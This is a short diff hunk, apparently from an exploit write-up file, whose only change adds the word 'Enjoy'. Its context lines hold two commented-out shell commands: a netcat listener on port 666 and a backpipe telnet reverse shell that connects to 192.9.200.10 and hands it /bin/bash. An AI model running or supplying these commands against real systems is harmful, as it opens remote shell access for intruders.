@@ -1384,7 +1384,7 @@ Enjoy
 
 #nc -n -vv -l -p 666
 #mknod backpipe p && telnet 192.9.200.10 666 0<backpipe | /bin/bash 1>backpipe
-
+Enjoy
 
 
 
